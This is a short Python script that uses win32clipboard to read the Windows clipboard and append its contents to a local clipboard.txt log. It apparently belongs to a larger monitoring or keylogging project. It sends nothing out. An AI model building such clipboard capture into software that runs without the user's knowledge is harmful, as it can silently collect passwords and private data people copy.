# --------------------------------------------------------------------------------------------------------
#                                         IMPORTING LIBRARIES 

# Import ClipBoard Acess libraries
import os
import win32clipboard

# --------------------------------------------------------------------------------------------------------

def copy_clipboard():
    
    # Check if the file exists, create if it doesn't
    file_exists = os.path.exists("clipboard.txt")
    
    with open("clipboard.txt", "a") as f:
        if not file_exists:
            f.write("Clipboard log initiated.\n")
        
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            f.write("\n\nClipBoard Data:\n" + pasted_data)
        except Exception as e:
            f.write("\n\nCouldn't copy clipboard data: " + str(e))
            
# copy_clipboard()            